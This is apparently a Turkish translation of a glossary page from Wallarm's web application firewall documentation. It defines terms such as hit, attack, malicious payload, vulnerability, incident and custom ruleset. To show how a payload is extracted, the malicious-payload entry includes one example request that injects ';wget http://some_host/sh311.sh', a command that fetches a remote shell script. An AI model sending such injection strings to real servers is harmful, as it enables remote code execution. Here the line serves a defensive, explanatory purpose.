# Terimler Sözlüğü

Sözlük, platformu daha iyi anlamanız için temel Wallarm varlıklarını kapsamaktadır.

## Hit

Hit, seri hale getirilmiş kötü amaçlı bir istek (orijinal kötü amaçlı istek ve filtreleme düğümü tarafından eklenen meta veriler) anlamına gelir, örneğin:

![Hit örneği](images/user-guides/events/analyze-attack-raw.png)

[Hit parametreleri hakkında detaylar](user-guides/events/check-attack.md#attack-analysis_1)

## Saldırı

Saldırı, tek bir hit veya birden fazla hit'in [gruplandırılmış](user-guides/events/grouping-sampling.md#grouping-of-hits) halidir.

Tek bir hit içeren bir saldırı örneği:

![Bir hit ile saldırı](images/glossary/attack-with-one-hit-example.png)

Birden fazla hit içeren bir saldırı örneği:

![Birçok hit ile saldırı](images/glossary/attack-with-several-hits-example.png)

Saldırıları anlama ve analiz etme hakkında [detaylara](user-guides/events/check-attack.md) bakınız.

## Kötü Amaçlı Yük

Orijinal bir isteğin, aşağıdaki öğeleri içeren kısmıdır:

* Bir istekte tespit edilen saldırı işaretleri. Bir istekte aynı saldırı türünü karakterize eden birden fazla saldırı işareti tespit edilirse, yalnızca ilk işaret yük olarak kaydedilir.
* Saldırı işareti bağlamı. Bağlam, tespit edilen saldırı işaretlerinden önce gelen ve sonrasında gelen sembollerin kümesidir. Yük uzunluğu sınırlı olduğundan, bir saldırı işareti tüm yük uzunluğunda ise bağlam atlanabilir.

Örneğin:

* İstek:

    ```bash
    curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
    ```
* Kötü amaçlı yük:

    ```bash
    ;wget+http://s
    ```

    Bu yükte, `;wget+` [RCE](attacks-vulns-list.md#remote-code-execution-rce) saldırı işaretidir ve yükün diğer kısmı saldırı işareti bağlamını oluşturmaktadır.

Saldırı işaretleri, [davranışsal saldırıları](about-wallarm/protecting-against-attacks.md#behavioral-attacks) tespit etmekte kullanılmadığından, davranışsal saldırılar kapsamında gönderilen isteklerin yükleri boştur.

## Güvenlik Açığı

Güvenlik açığı, bir web uygulaması oluşturulurken veya uygulanırken ihmal veya yetersiz bilgi nedeniyle yapılan bir hatadır ve bilgi güvenliği risklerine yol açabilir.

Bilgi güvenliği riskleri şunlardır:

* Yetkisiz veri erişimi; örneğin, kullanıcı verilerini okuma ve değiştirme erişimi.
* Hizmet reddi.
* Veri bozulması ve diğerleri.

İnternet trafiği, güvenlik açıklarını tespit etmek için kullanılabilir; Wallarm'ın diğer işlevleri arasında bu da yer almaktadır.

## Güvenlik Olayı

Güvenlik olayı, bir güvenlik açığının sömürülmesidir. Bir olay, doğrulanmış bir güvenlik açığına yönelik bir [saldırı](#attack)'dır.

Bir olay, tıpkı bir saldırı gibi, sisteminiz dışındaki bir varlıktır ve dış İnternet'in bir özelliğini yansıtır, sistemin kendisini değil. Mevcut güvenlik açıklarına yönelik saldırılar azınlıkta olsa da, bilgi güvenliği açısından son derece önemlidir. Wallarm, mevcut güvenlik açıklarına yönelik saldırıları otomatik olarak tespit eder ve bunları ayrı bir nesne olarak görüntüler – olay.

## Dairesel Kuyruk

Dairesel kuyruk, sanki birbirine bağlıymış gibi tek, sabit boyutlu bir arabellek kullanan bir veri yapısıdır.
[See Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).

## Özel Kurallar Seti (önceki terim LOM)

Özel kurallar seti, Wallarm Cloud'dan Wallarm düğümleri tarafından indirilen derlenmiş güvenlik kuralları bütünüdür.

Özel kurallar, trafik işleme için bireysel kurallar oluşturmanızı sağlar, örneğin:

* Wallarm Cloud'a yüklemeden önce hassas verileri maskeleme
* Düzenli ifadeye dayalı saldırı göstergeleri oluşturma
* Aktif bir güvenlik açığından yararlanan istekleri engelleyen sanal yama uygulama
* Belirli isteklerde saldırı tespitini devre dışı bırakma vb.

Özel kurallar seti varsayılan olarak boş değildir; Cloud'da kayıtlı tüm müşteriler için oluşturulan kuralları içerir, örneğin [**Ayarlar → Genel** sekmesindeki](admin-en/configure-wallarm-mode.md#general-filtration-rule-in-wallarm-console) filtreleme modu kuralı.

[Özel kurallar seti hakkında daha fazla detay](user-guides/rules/rules.md)

## Geçersiz İstek

Filtreleme düğümü tarafından kontrol edilen ve LOM kurallarıyla eşleşmeyen istek.

## Reverse Proxy

Reverse Proxy, bir istemci adına bir sunucudan kaynakları alıp, bu kaynakları Web sunucusundan geliyormuş gibi istemciye dönen bir proxy sunucusu türüdür.
[See Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).

## Certificate Authority

Certificate Authority, dijital sertifikalar düzenleyen bir varlıktır.
[See Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).